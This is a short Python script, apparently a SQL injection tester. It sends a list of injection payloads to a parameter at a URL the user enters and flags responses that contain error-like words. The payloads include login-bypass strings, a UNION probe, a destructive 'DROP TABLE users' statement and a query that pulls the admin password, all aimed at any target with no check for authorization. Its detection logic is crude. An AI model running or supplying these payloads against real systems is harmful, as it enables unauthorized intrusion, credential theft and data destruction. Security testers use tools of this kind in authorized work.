import requests
import urllib.parse

# List of common SQL injection payloads
SQL_PAYLOADS = [
    "' OR 1=1 -- ",
    "' OR 'a'='a' -- ",
    "' UNION SELECT NULL, NULL, NULL -- ",
    "' AND 1=2 -- ",
    "' OR 1=1 LIMIT 1 OFFSET 1 -- ",
    "'; DROP TABLE users -- ",
    "'; SELECT password FROM users WHERE username='admin' -- "
]

# Function to check for SQL injection vulnerability
def test_sql_injection(url, payloads, param):
    # Try each payload and check for errors or abnormal behavior
    for payload in payloads:
        # Encode the payload
        encoded_payload = urllib.parse.quote(payload)
        
        # Prepare the target URL with the payload injected
        test_url = f"{url}?{param}={encoded_payload}"
        
        try:
            print(f"Testing payload: {payload} on {url}")
            response = requests.get(test_url, timeout=8)
            
            # Check for common signs of SQL injection vulnerability
            if response.status_code == 200:
                # Check for error messages in the response body (common SQL error patterns)
                if "mysql" in response.text.lower() or "syntax" in response.text.lower() or "error" in response.text.lower():
                    print(f"Potential SQL Injection Vulnerability found at: {test_url}")
                    print(f"Payload: {payload}")
                else:
                    print(f"No SQL Injection vulnerability detected with payload: {payload}")
            else:
                print(f"Error with status code: {response.status_code}")
        except requests.RequestException as e:
            print(f"Error with request: {e}")
            
# Main function
def main():
    print("SQL Injection Vulnerability Tester\n")
    url = input("Enter the target URL (with the parameter to test): ").strip()
    param = input("Enter the parameter name to test (e.g., id, user): ").strip()
    
    test_sql_injection(url, SQL_PAYLOADS, param)

if __name__ == "__main__":
    main()
